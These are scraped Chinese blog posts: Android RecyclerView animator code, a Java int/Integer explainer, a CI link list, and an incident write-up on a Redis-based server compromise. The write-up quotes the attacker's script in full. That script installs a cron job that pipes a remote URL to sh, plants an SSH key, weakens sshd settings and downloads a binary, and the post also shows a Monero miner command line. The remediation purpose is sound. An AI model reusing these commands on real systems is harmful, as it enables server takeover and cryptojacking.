}).start();\n    }\n\n    @Override\n    public boolean animateChange(RecyclerView.ViewHolder oldHolder, RecyclerView.ViewHolder newHolder,\n                                 int fromX, int fromY, int toX, int toY) {\n        if (oldHolder == newHolder) {\n            // Don't know how to run change animations when the same view holder is re-used.\n            // run a move animation to handle position changes.\n            return animateMove(oldHolder, fromX, fromY, toX, toY);\n        }\n        final float prevTranslationX = ViewCompat.getTranslationX(oldHolder.itemView);\n        final float prevTranslationY = ViewCompat.getTranslationY(oldHolder.itemView);\n        final float prevAlpha = ViewCompat.getAlpha(oldHolder.itemView);\n        resetAnimation(oldHolder);\n        int deltaX = (int) (toX - fromX - prevTranslationX);\n        int deltaY = (int) (toY - fromY - prevTranslationY);\n        // recover prev translation state after ending animation\n        ViewCompat.setTranslationX(oldHolder.itemView, prevTranslationX);\n        ViewCompat.setTranslationY(oldHolder.itemView, prevTranslationY);\n        ViewCompat.setAlpha(oldHolder.itemView, prevAlpha);\n        if (newHolder != null) {\n            // carry over translation values\n            resetAnimation(newHolder);\n            ViewCompat.setTranslationX(newHolder.itemView, -deltaX);\n            ViewCompat.setTranslationY(newHolder.itemView, -deltaY);\n            ViewCompat.setAlpha(newHolder.itemView, 0);\n        }\n        mPendingChanges.add(new NoAlphaItemAnimator.ChangeInfo(oldHolder, newHolder, fromX, fromY, toX, toY));\n        return true;\n    }\n\n    void animateChangeImpl(final NoAlphaItemAnimator.ChangeInfo changeInfo) {\n        final RecyclerView.ViewHolder holder = changeInfo.oldHolder;\n        final View view = holder == null ? null : holder.itemView;\n        final RecyclerView.ViewHolder newHolder = changeInfo.newHolder;\n        final View newView = newHolder != null ? newHolder.itemView : null;\n        if (view != null) {\n            final ViewPropertyAnimatorCompat oldViewAnim = ViewCompat.animate(view).setDuration(\n                    getChangeDuration());\n            mChangeAnimations.add(changeInfo.oldHolder);\n            oldViewAnim.translationX(changeInfo.toX - changeInfo.fromX);\n            oldViewAnim.translationY(changeInfo.toY - changeInfo.fromY);\n            oldViewAnim.setListener(new NoAlphaItemAnimator.VpaListenerAdapter() {\n                @Override\n                public void onAnimationStart(View view) {\n                    dispatchChangeStarting(changeInfo.oldHolder, true);\n                }\n\n                @Override\n                public void onAnimationEnd(View view) {\n                    oldViewAnim.setListener(null);\n                    ViewCompat.setAlpha(view, 1);\n                    ViewCompat.setTranslationX(view, 0);\n                    ViewCompat.setTranslationY(view, 0);\n                    dispatchChangeFinished(changeInfo.oldHolder, true);\n                    mChangeAnimations.remove(changeInfo.oldHolder);\n                    dispatchFinishedWhenDone();\n                }\n            }).start();\n        }\n        if (newView != null) {\n            final ViewPropertyAnimatorCompat newViewAnimation = ViewCompat.animate(newView);\n            mChangeAnimations.add(changeInfo.newHolder);\n            newViewAnimation.translationX(0).translationY(0).setDuration(getChangeDuration()).\n                    setListener(new NoAlphaItemAnimator.VpaListenerAdapter() {\n                @Override\n                public void onAnimationStart(View view) {\n                    dispatchChangeStarting(changeInfo.newHolder, false);\n                }\n                @Override\n                public void onAnimationEnd(View view) {\n                    newViewAnimation.setListener(null);\n                    ViewCompat.setAlpha(newView, 1);\n                    ViewCompat.setTranslationX(newView, 0);\n                    ViewCompat.setTranslationY(newView, 0);\n                    dispatchChangeFinished(changeInfo.newHolder, false);\n                    mChangeAnimations.remove(changeInfo.newHolder);\n                    dispatchFinishedWhenDone();\n                }\n            }).start();\n        }\n    }\n\n    private void endChangeAnimation(List<NoAlphaItemAnimator.ChangeInfo> infoList, RecyclerView.ViewHolder item) {\n        for (int i = infoList.size() - 1; i >= 0; i--) {\n            NoAlphaItemAnimator.ChangeInfo changeInfo = infoList.get(i);\n            if (endChangeAnimationIfNecessary(changeInfo, item)) {\n                if (changeInfo.oldHolder == null && changeInfo.newHolder == null) {\n                    infoList.remove(changeInfo);\n                }\n            }\n        }\n    }\n\n    private void endChangeAnimationIfNecessary(NoAlphaItemAnimator.ChangeInfo changeInfo) {\n        if (changeInfo.oldHolder != null) {\n            endChangeAnimationIfNecessary(changeInfo, changeInfo.oldHolder);\n        }\n        if (changeInfo.newHolder != null) {\n            endChangeAnimationIfNecessary(changeInfo, changeInfo.newHolder);\n        }\n    }\n    private boolean endChangeAnimationIfNecessary(NoAlphaItemAnimator.ChangeInfo changeInfo, RecyclerView.ViewHolder item) {\n        boolean oldItem = false;\n        if (changeInfo.newHolder == item) {\n            changeInfo.newHolder = null;\n        } else if (changeInfo.oldHolder == item) {\n            changeInfo.oldHolder = null;\n            oldItem = true;\n        } else {\n            return false;\n        }\n        ViewCompat.setAlpha(item.itemView, 1);\n        ViewCompat.setTranslationX(item.itemView, 0);\n        ViewCompat.setTranslationY(item.itemView, 0);\n        dispatchChangeFinished(item, oldItem);\n        return true;\n    }\n\n    @Override\n    public void endAnimation(RecyclerView.ViewHolder item) {\n        final View view = item.itemView;\n        // this will trigger end callback which should set properties to their target values.\n        ViewCompat.animate(view).cancel();\n        // TODO if some other animations are chained to end, how do we cancel them as well?\n        for (int i = mPendingMoves.size() - 1; i >= 0; i--) {\n            NoAlphaItemAnimator.MoveInfo moveInfo = mPendingMoves.get(i);\n            if (moveInfo.holder == item) {\n                ViewCompat.setTranslationY(view, 0);\n                ViewCompat.setTranslationX(view, 0);\n                dispatchMoveFinished(item);\n                mPendingMoves.remove(i);\n            }\n        }\n        endChangeAnimation(mPendingChanges, item);\n        if (mPendingRemovals.remove(item)) {\n            ViewCompat.setAlpha(view, 1);\n            dispatchRemoveFinished(item);\n        }\n        if (mPendingAdditions.remove(item)) {\n            ViewCompat.setAlpha(view, 1);\n            dispatchAddFinished(item);\n        }\n\n        for (int i = mChangesList.size() - 1; i >= 0; i--) {\n            ArrayList<NoAlphaItemAnimator.ChangeInfo> changes = mChangesList.get(i);\n            endChangeAnimation(changes, item);\n            if (changes.isEmpty()) {\n                mChangesList.remove(i);\n            }\n        }\n        for (int i = mMovesList.size() - 1; i >= 0; i--) {\n            ArrayList<NoAlphaItemAnimator.MoveInfo> moves = mMovesList.get(i);\n            for (int j = moves.size() - 1; j >= 0; j--) {\n                NoAlphaItemAnimator.MoveInfo moveInfo = moves.get(j);\n                if (moveInfo.holder == item) {\n                    ViewCompat.setTranslationY(view, 0);\n                    ViewCompat.setTranslationX(view, 0);\n                    dispatchMoveFinished(item);\n                    moves.remove(j);\n                    if (moves.isEmpty()) {\n                        mMovesList.remove(i);\n                    }\n                    break;\n                }\n            }\n        }\n        for (int i = mAdditionsList.size() - 1; i >= 0; i--) {\n            ArrayList<RecyclerView.ViewHolder> additions = mAdditionsList.get(i);\n            if (additions.remove(item)) {\n                ViewCompat.setAlpha(view, 1);\n                dispatchAddFinished(item);\n                if (additions.isEmpty()) {\n                    mAdditionsList.remove(i);\n                }\n            }\n        }\n\n        // animations should be ended by the cancel above.\n        //noinspection PointlessBooleanExpression,ConstantConditions\n        if (mRemoveAnimations.remove(item) && DEBUG) {\n            throw new IllegalStateException(\"after animation is cancelled, item should not be in \"\n                    + \"mRemoveAnimations list\");\n        }\n\n        //noinspection PointlessBooleanExpression,ConstantConditions\n        if (mAddAnimations.remove(item) && DEBUG) {\n            throw new IllegalStateException(\"after animation is cancelled, item should not be in \"\n                    + \"mAddAnimations list\");\n        }\n\n        //noinspection PointlessBooleanExpression,ConstantConditions\n        if (mChangeAnimations.remove(item) && DEBUG) {\n            throw new IllegalStateException(\"after animation is cancelled, item should not be in \"\n                    + \"mChangeAnimations list\");\n        }\n\n        //noinspection PointlessBooleanExpression,ConstantConditions\n        if (mMoveAnimations.remove(item) && DEBUG) {\n            throw new IllegalStateException(\"after animation is cancelled, item should not be in \"\n                    + \"mMoveAnimations list\");\n        }\n        dispatchFinishedWhenDone();\n    }\n\n    private void resetAnimation(RecyclerView.ViewHolder holder) {\n        AnimatorCompatHelper.clearInterpolator(holder.itemView);\n        endAnimation(holder);\n    }\n\n    @Override\n    public boolean isRunning() {\n        return (!mPendingAdditions.isEmpty() ||\n                !mPendingChanges.isEmpty() ||\n                !mPendingMoves.isEmpty() ||\n                !mPendingRemovals.isEmpty() ||\n                !mMoveAnimations.isEmpty() ||\n                !mRemoveAnimations.isEmpty() ||\n                !mAddAnimations.isEmpty() ||\n                !mChangeAnimations.isEmpty() ||\n                !mMovesList.isEmpty() ||\n                !mAdditionsList.isEmpty() ||\n                !mChangesList.isEmpty());\n    }\n\n    /**\n     * Check the state of currently pending and running animations. If there are none\n     * pending/running, call {@link #dispatchAnimationsFinished()} to notify any\n     * listeners.\n     */\n    void dispatchFinishedWhenDone() {\n        if (!isRunning()) {\n            dispatchAnimationsFinished();\n        }\n    }\n\n    @Override\n    public void endAnimations() {\n        int count = mPendingMoves.size();\n        for (int i = count - 1; i >= 0; i--) {\n            NoAlphaItemAnimator.MoveInfo item = mPendingMoves.get(i);\n            View view = item.holder.itemView;\n            ViewCompat.setTranslationY(view, 0);\n            ViewCompat.setTranslationX(view, 0);\n            dispatchMoveFinished(item.holder);\n            mPendingMoves.remove(i);\n        }\n        count = mPendingRemovals.size();\n        for (int i = count - 1; i >= 0; i--) {\n            RecyclerView.ViewHolder item = mPendingRemovals.get(i);\n            dispatchRemoveFinished(item);\n            mPendingRemovals.remove(i);\n        }\n        count = mPendingAdditions.size();\n        for (int i = count - 1; i >= 0; i--) {\n            RecyclerView.ViewHolder item = mPendingAdditions.get(i);\n            View view = item.itemView;\n            ViewCompat.setAlpha(view, 1);\n            dispatchAddFinished(item);\n            mPendingAdditions.remove(i);\n        }\n        count = mPendingChanges.size();\n        for (int i = count - 1; i >= 0; i--) {\n            endChangeAnimationIfNecessary(mPendingChanges.get(i));\n        }\n        mPendingChanges.clear();\n        if (!isRunning()) {\n            return;\n        }\n\n        int listCount = mMovesList.size();\n        for (int i = listCount - 1; i >= 0; i--) {\n            ArrayList<NoAlphaItemAnimator.MoveInfo> moves = mMovesList.get(i);\n            count = moves.size();\n            for (int j = count - 1; j >= 0; j--) {\n                NoAlphaItemAnimator.MoveInfo moveInfo = moves.get(j);\n                RecyclerView.ViewHolder item = moveInfo.holder;\n                View view = item.itemView;\n                ViewCompat.setTranslationY(view, 0);\n                ViewCompat.setTranslationX(view, 0);\n                dispatchMoveFinished(moveInfo.holder);\n                moves.remove(j);\n                if (moves.isEmpty()) {\n                    mMovesList.remove(moves);\n                }\n            }\n        }\n        listCount = mAdditionsList.size();\n        for (int i = listCount - 1; i >= 0; i--) {\n            ArrayList<RecyclerView.ViewHolder> additions = mAdditionsList.get(i);\n            count = additions.size();\n            for (int j = count - 1; j >= 0; j--) {\n                RecyclerView.ViewHolder item = additions.get(j);\n                View view = item.itemView;\n                ViewCompat.setAlpha(view, 1);\n                dispatchAddFinished(item);\n                additions.remove(j);\n                if (additions.isEmpty()) {\n                    mAdditionsList.remove(additions);\n                }\n            }\n        }\n        listCount = mChangesList.size();\n        for (int i = listCount - 1; i >= 0; i--) {\n            ArrayList<NoAlphaItemAnimator.ChangeInfo> changes = mChangesList.get(i);\n            count = changes.size();\n            for (int j = count - 1; j >= 0; j--) {\n                endChangeAnimationIfNecessary(changes.get(j));\n                if (changes.isEmpty()) {\n                    mChangesList.remove(changes);\n                }\n            }\n        }\n\n        cancelAll(mRemoveAnimations);\n        cancelAll(mMoveAnimations);\n        cancelAll(mAddAnimations);\n        cancelAll(mChangeAnimations);\n\n        dispatchAnimationsFinished();\n    }\n\n    void cancelAll(List<RecyclerView.ViewHolder> viewHolders) {\n        for (int i = viewHolders.size() - 1; i >= 0; i--) {\n            ViewCompat.animate(viewHolders.get(i).itemView).cancel();\n        }\n    }\n\n    /**\n     * {@inheritDoc}\n     * <p>\n     * If the payload list is not empty, NoAlphaItemAnimator returns <code>true</code>.\n     * When this is the case:\n     * <ul>\n     * <li>If you override {@link #animateChange(RecyclerView.ViewHolder, RecyclerView.ViewHolder, int, int, int, int)}, both\n     * ViewHolder arguments will be the same instance.\n     * </li>\n     * <li>\n     * If you are not overriding {@link #animateChange(RecyclerView.ViewHolder, RecyclerView.ViewHolder, int, int, int, int)},\n     * then NoAlphaItemAnimator will call {@link #animateMove(RecyclerView.ViewHolder, int, int, int, int)} and\n     * run a move animation instead.\n     * </li>\n     * </ul>\n     */\n    @Override\n    public boolean canReuseUpdatedViewHolder(@NonNull RecyclerView.ViewHolder viewHolder,\n                                             @NonNull List<Object> payloads) {\n        return !payloads.isEmpty() || super.canReuseUpdatedViewHolder(viewHolder, payloads);\n    }\n\n    private static class VpaListenerAdapter implements ViewPropertyAnimatorListener {\n        VpaListenerAdapter() {\n        }\n\n        @Override\n        public void onAnimationStart(View view) {}\n\n        @Override\n        public void onAnimationEnd(View view) {}\n\n        @Override\n        public void onAnimationCancel(View view) {}\n    }\n}", "time": "2018_08_14_11_13_00", "link": "https://blog.csdn.net/chenliguan/article/details/52809758", "title": "Android进阶之解决RecyclerView notifyItem闪屏问题"}
{"timestamp": "2018_08_14_11_13_01", "desc": "1 int与Integer的基本使用对比\n\n（1）Integer是int的包装类；int是基本数据类型； \n（2）Integer变量必须实例化后才能使用；int变量不需要； \n（3）Integer实际是对象的引用，指向此new的Integer对象；int是直接存储数据值 ； \n（4）Integer的默认值是null；int的默认值是0。\n\n\n\n2 int与Integer的深入对比\n\n（1）由于Integer变量实际上是对一个Integer对象的引用，所以两个通过new生成的Integer变量永远是不相等的（因为new生成的是两个对象，其内存地址不同）。\n\n\n\nInteger i = new Integer(100);\nInteger j = new Integer(100);\nSystem.out.print(i == j); //false\n\n（2）Integer变量和int变量比较时，只要两个变量的值是向等的，则结果为true（因为包装类Integer和基本数据类型int比较时，java会自动拆包装为int，然后进行比较，实际上就变为两个int变量的比较）\n\n\n\nInteger i = new Integer(100);\nint j = 100；\nSystem.out.print(i == j); //true\n\n（3）非new生成的Integer变量和new Integer()生成的变量比较时，结果为false。（因为非new生成的Integer变量指向的是java常量池中的对象，而new Integer()生成的变量指向堆中新建的对象，两者在内存中的地址不同）\n\n\n\nInteger i = new Integer(100);\nInteger j = 100;\nSystem.out.print(i == j); //false\n\n（4）对于两个非new生成的Integer对象，进行比较时，如果两个变量的值在区间-128到127之间，则比较结果为true，如果两个变量的值不在此区间，则比较结果为false\n\n\n\nInteger i = 100;\nInteger j = 100;\nSystem.out.print(i == j); //true\n\nInteger i = 128;\nInteger j = 128;\nSystem.out.print(i == j); //false\n\n　　对于第4条的原因： java在编译Integer i = 100 ;时，会翻译成为Integer i = Integer.valueOf(100)。而java API中对Integer类型的valueOf的定义如下，对于-128到127之间的数，会进行缓存，Integer i = 127时，会将127进行缓存，下次再写Integer j = 127时，就会直接从缓存中取，就不会new了。\n\n\n\npublic static Integer valueOf(int i){\n    assert IntegerCache.high >= 127;\n    if (i >= IntegerCache.low && i <= IntegerCache.high){\n        return IntegerCache.cache[i + (-IntegerCache.low)];\n    }\n    return new Integer(i);\n}\n\n\n\n3 Java两种数据类型\n\n\n\n3.1 Java两种数据类型分类\n\n（1）基本数据类型，分为boolean、byte、int、char、long、short、double、float； \n（2）引用数据类型 ，分为数组、类、接口。\n\n3.2 Java为每个原始类型提供了封装类\n\n　　为了编程的方便还是引入了基本数据类型，但是为了能够将这些基本数据类型当成对象操作，Java为每 一个基本数据类型都引入了对应的包装类型（wrapper class），int的包装类就是Integer，从Java 5开始引入了自动装箱/拆箱机制，使得二者可以相互转换。\n\n\n\n基本数据类型: boolean，char，byte，short，int，long，float，double\n封装类类型：Boolean，Character，Byte，Short，Integer，Long，Float，Double\n\n4 基本解析\n\n\n\n4.1 自动装箱：将基本数据类型重新转化为对象\n\n\n\n    public class Test {  \n        public static void main(String[] args) {  \n            //声明一个Integer对象\n            Integer num = 9;\n\n            //以上的声明就是用到了自动的装箱：解析为:Integer num = new Integer(9);\n        }  \n    }  \n\n　　9是属于基本数据类型的，原则上它是不能直接赋值给一个对象Integer的，但jdk1.5后你就可以进行这样的声明。自动将基本数据类型转化为对应的封装类型，成为一个对象以后就可以调用对象所声明的所有的方法。\n\n\n\n4.2 自动拆箱：将对象重新转化为基本数据类型\n\n\n\n public class Test {  \n        public static void main(String[] args) {  \n            //声明一个Integer对象\n            Integer num = 9;\n\n            //进行计算时隐含的有自动拆箱\n            System.out.print(num--);\n        }  \n    }  \n\n　　因为对象时不能直接进行运算的，而是要转化为基本数据类型后才能进行加减乘除。对比：\n\n\n\n/装箱\nInteger num = 10;\n//拆箱\nint num1 = num;\n\n\n\n5 深入解析\n\n\n\n5.1 情况描述\n\n\n\n   public class Test {  \n        public static void main(String[] args) {  \n            //在-128~127 之外的数\n            Integer num1 = 128;   Integer num2 = 128;           \n            System.out.println(num1==num2);   //false\n\n            // 在-128~127 之内的数 \n            Integer num3 = 9;   Integer num4 = 9;   \n            System.out.println(num3==num4);   //true\n        }  \n    }  \n\n　　解析原因：归结于java对于Integer与int的自动装箱与拆箱的设计，是一种模式：叫享元模式（flyweight）。 \n　　加大对简单数字的重利用，Java定义在自动装箱时对于值从–128到127之间的值，它们被装箱为Integer对象后，会存在内存中被重用，始终只存在一个对象。 \n而如果超过了从–128到127之间的值，被装箱后的Integer对象并不会被重用，即相当于每次装箱时都新建一个 Integer对象。\n\n\n\n5.2 Integer源码解析\n\n　　给一个Integer对象赋一个int值的时候，会调用Integer类的静态方法valueOf，源码如下：\n\n\n\npublic static Integer valueOf(String s, int radix) throws NumberFormatException {\n        return Integer.valueOf(parseInt(s,radix));\n    }\n\n\n\npublic static Integer valueOf(int i) {\n        assert IntegerCache.high >= 127;\n        if (i >= IntegerCache.low && i <= IntegerCache.high)\n            return IntegerCache.cache[i + (-IntegerCache.low)];\n        return new Integer(i);\n    }\n\n　　IntegerCache是Integer的内部类，源码如下：\n\n\n\n     /**\n      * 缓存支持自动装箱的对象标识语义\n      * -128和127（含）。\n      *\n      * 缓存在第一次使用时初始化。 缓存的大小\n      * 可以由-XX：AutoBoxCacheMax = <size>选项控制。\n      * 在VM初始化期间，java.lang.Integer.IntegerCache.high属性\n      * 可以设置并保存在私有系统属性中\n     */\n    private static class IntegerCache {\n        static final int low = -128;\n        static final int high;\n        static final Integer cache[];\n\n        static {\n            // high value may be configured by property\n            int h = 127;\n            String integerCacheHighPropValue =\n                sun.misc.VM.getSavedProperty(\"java.lang.Integer.IntegerCache.high\");\n            if (integerCacheHighPropValue != null) {\n                int i = parseInt(integerCacheHighPropValue);\n                i = Math.max(i, 127);\n                // Maximum array size is Integer.MAX_VALUE\n                h = Math.min(i, Integer.MAX_VALUE - (-low) -1);\n            }\n            high = h;\n\n            cache = new Integer[(high - low) + 1];\n            int j = low;\n            for(int k = 0; k < cache.length; k++)\n                cache[k] = new Integer(j++);\n        }\n\n        private IntegerCache() {}\n    }\n\n\n\n6 参考链接\n\nInteger与int的种种比较你知道多少？\n\n分析int和Integer的区别\n\njava 自动装箱与拆箱\n\n int和Integer有什么区别?", "time": "2018_08_14_11_13_01", "link": "https://blog.csdn.net/chenliguan/article/details/53888018", "title": "Java基础之int和Integer有什么区别"}
{"timestamp": "2018_08_14_11_13_01", "desc": "刚开始搞服务器踩过的坑，贴出来分享下，当时应该是centos 6。\n\n2016年10月15日23:01:55更新\n\n攻击教程\n\n该问题是因为redis可外网访问的漏洞导致，黑客在定时任务里执行自己的脚本，脚本内容如下：\n\n\n\n[root@iZ25o9lq6f5Z ~]# cat pm.sh\\?0706 \nexport PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin\n\necho \"*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh\" > /var/spool/cron/root\nmkdir -p /var/spool/cron/crontabs\necho \"*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh\" > /var/spool/cron/crontabs/root\n\nif [ ! -f \"/root/.ssh/KHK75NEOiq\" ]; then\n        mkdir -p ~/.ssh\n        rm -f ~/.ssh/authorized_keys*\n        echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root\" > ~/.ssh/KHK75NEOiq\n        echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n        echo \"RSAAuthentication yes\" >> /etc/ssh/sshd_config\n        echo \"PubkeyAuthentication yes\" >> /etc/ssh/sshd_config\n        echo \"AuthorizedKeysFile .ssh/KHK75NEOiq\" >> /etc/ssh/sshd_config\n        /etc/init.d/sshd restart\nfi\n\nif [ ! -f \"/etc/init.d/ntp\" ]; then\n        if [ ! -f \"/etc/systemd/system/ntp.service\" ]; then\n                mkdir -p /opt\n                curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33 -Install\n        fi\nfi\n\n/etc/init.d/ntp start\n\nps auxf|grep -v grep|grep \"/usr/bin/cron\"|awk '{print $2}'|xargs kill -9\nps auxf|grep -v grep|grep \"/opt/cron\"|awk '{print $2}'|xargs kill -9\n\n==该脚本里涉及到的文件夹和文件都需要处理==\n\n彻底解决问题\n\n\n  配置防火墙\n  \n  然后就是处理服务器里面的问题了==该脚本里涉及到的文件夹和文件都需要处理==\n\n\n\n\n第一次编辑\n\n\n  查看CPU占用前十进程\n\n\n\n\n[root@iZ25o9lq6f5Z ~]# ps -eo comm,pcpu --sort -pcpu | head -10\nCOMMAND         %CPU\nminerd          98.4\njava             0.3\nAliHids          0.3\nAliYunDun        0.2\nredis-server     0.1\njava             0.1\ninit             0.0\nkthreadd         0.0\nmigration/0      0.0\n[root@iZ25o9lq6f5Z ~]# \n\n\n  kill掉minerd进程\n\n\n\n\n[root@iZ25o9lq6f5Z ~]# ps aux | grep minerd\nroot      2449 98.4  0.5 239504  5376 ?        SLsl Oct03 445:54 /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:6666 -u 48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKkcvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x\nroot      5384  0.0  0.0 103256   848 pts/0    S+   06:53   0:00 grep minerd\n[root@iZ25o9lq6f5Z ~]# kill -9 2449\n[root@iZ25o9lq6f5Z ~]# ps aux | grep minerd\nroot      5386  0.0  0.0 103252   844 pts/0    S+   06:53   0:00 grep minerd\n[root@iZ25o9lq6f5Z ~]# \n\n\n  kill后又出现了该进程\n\n\n\n\n[root@iZ25o9lq6f5Z opt]# ps aux | grep minerd\nroot      5388 98.2  0.3 239504  3364 ?        SLsl 06:53   2:07 /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:6666 -u 48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKkcvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x\nroot      5405  0.0  0.0 103252   844 pts/0    S+   06:55   0:00 grep minerd\n[root@iZ25o9lq6f5Z opt]# \n\n\n  查看该进程的启动文件\n\n\n\n\n[root@iZ25o9lq6f5Z opt]# ls -la /opt/\ntotal 11172\ndrwxr-xr-x.  3 root root    4096 Oct  4 06:54 .\ndr-xr-xr-x. 23 root root    4096 Sep 26 00:15 ..\n-rwxr-xr-x.  1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-rwxr-xr-x.  1 root root 2979640 Oct  3 23:17 minerd\ndrwxr-xr-x.  2 root root    4096 Nov 22  2013 rh\n[root@iZ25o9lq6f5Z opt]# \n\n\n  全改为只读\n\n\n\n\n[root@iZ25o9lq6f5Z opt]# ll\ntotal 11164\n-rwxr-xr-x. 1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-rwxr-xr-x. 1 root root 2979640 Oct  3 23:17 minerd\ndrwxr-xr-x. 2 root root    4096 Nov 22  2013 rh\n[root@iZ25o9lq6f5Z opt]# sudo chmod u-x minerd \n[root@iZ25o9lq6f5Z opt]# ll\ntotal 11164\n-rwxr-xr-x. 1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-rw-r-xr-x. 1 root root 2979640 Oct  3 23:17 minerd\ndrwxr-xr-x. 2 root root    4096 Nov 22  2013 rh\n[root@iZ25o9lq6f5Z opt]# sudo chmod 400 minerd \n[root@iZ25o9lq6f5Z opt]# ll\ntotal 11164\n-rwxr-xr-x. 1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-r--------. 1 root root 2979640 Oct  3 23:17 minerd\ndrwxr-xr-x. 2 root root    4096 Nov 22  2013 rh\n[root@iZ25o9lq6f5Z opt]# sudo chmod 400 KHK75NEOiq33 \n[root@iZ25o9lq6f5Z opt]# ll\ntotal 11164\n-r--------. 1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-r--------. 1 root root 2979640 Oct  3 23:17 minerd\ndrwxr-xr-x. 2 root root    4096 Nov 22  2013 rh\n[root@iZ25o9lq6f5Z opt]# sudo chmod 400 rh\n[root@iZ25o9lq6f5Z opt]# ll\ntotal 11164\n-r--------. 1 root root 8444416 Sep 25 23:23 KHK75NEOiq33\n-r--------. 1 root root 2979640 Oct  3 23:17 minerd\ndr--------. 2 root root    4096 Nov 22  2013 rh\n\n\n  再杀\n\n\n\n\n[root@iZ25o9lq6f5Z opt]# ps aux | grep minerd\nroot      5388 98.5  0.3 239504  3364 ?        SLsl 06:53   6:28 /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:6666 -u 48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKkcvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x\nroot      5428  0.0  0.0 103252   844 pts/0    S+   06:59   0:00 grep minerd\n[root@iZ25o9lq6f5Z opt]# kill -9 5388\n[root@iZ25o9lq6f5Z opt]# ps aux | grep minerd\nroot      5435  0.0  0.0 103252   844 pts/0    S+   07:00   0:00 grep minerd\n[root@iZ25o9lq6f5Z opt]# ps aux | grep minerd\nroot      5439  0.0  0.0 103252   840 pts/0    S+   07:00   0:00 grep minerd\n[root@iZ25o9lq6f5Z opt]# ps -eo comm,pcpu --sort -pcpu | head -10\nCOMMAND         %CPU\njava             0.3\nAliHids          0.3\nAliYunDun        0.2\nredis-server     0.1\njava             0.1\ninit             0.0\nkthreadd         0.0\nmigration/0      0.0\nksoftirqd/0      0.0\n[root@iZ25o9lq6f5Z opt]# \n\n\n  查看定时脚本，同样存在问题，删掉\n\n\n\n\n[root@iZ25o9lq6f5Z ~]# crontab -l\n*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh\n[root@iZ25o9lq6f5Z ~]# \n\n\n\n[root@iZ25o9lq6f5Z ~]# cd /var/spool/cron/crontabs/\n[root@iZ25o9lq6f5Z crontabs]# ll\ntotal 4\n-rw-r--r--. 1 root root 64 Oct  4 06:40 root\n[root@iZ25o9lq6f5Z crontabs]# cat root \n*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh\n\n\n  关闭redis外网访问\n\n\n\n\n[root@iZ25o9lq6f5Z redis]# iptables -A INPUT -s 127.0.0.1 -p tcp --dport 6379 -j ACCEPT\n[root@iZ25o9lq6f5Z redis]# iptables -A INPUT -p TCP --dport 6379 -j REJECT\n\n\n  修改服务器密码，重启\n\n\n\n\n有人利用Redis的漏洞获得了服务器的访问权限\n\nhttp://blog.jobbole.com/94518/", "time": "2018_08_14_11_13_01", "link": "https://blog.csdn.net/chunlongyuan/article/details/79258443", "title": "被minerd挖矿"}
{"timestamp": "2018_08_14_11_13_02", "desc": "最近在搞持续集成，下面是用到的资料。\n\nAndroid/IOS UI自动化测试工具 \nhttps://github.com/appium/appium\n\nappium python api \nhttp://blog.csdn.net/bear_w/article/details/50330565\n\nappium \nhttps://www.cnblogs.com/fnng/p/4540731.html\n\n测试论坛 \nhttp://www.51testing.com/\n\nJenkins 创始人：持续交付的 What、Why 及 How \nhttp://www.51testing.com/html/24/n-3723324.html\n\nfacebook代码review \nhttps://www.phacility.com/\n\n分层自动化测试 \nhttp://blog.flow.ci/testing_cd/\n\n自动代码检查 \nSonar\n\n持续部署，并不简单！ \nhttp://blog.jobbole.com/22377/\n\n阮一峰讲解持续集成 \nhttp://www.ruanyifeng.com/blog/2015/09/continuous-integration.html\n\nIOS持续集成 \nhttp://kyson.cn/index.php/archives/34/\n\nAndroid持续集成 \nhttps://www.jianshu.com/p/38b2e17ced73\n\n持续集成系统的演进之路 \nhttp://jolestar.com/ci-teamcity-vs-jenkins/\n\n测试之家 \nhttps://testerhome.com/\n\n淘宝持续交付 \nhttp://www.51testing.com/html/46/n-2423046.html", "time": "2018_08_14_11_13_02", "link": "https://blog.csdn.net/chunlongyuan/article/details/79258394", "title": "持续集成"}
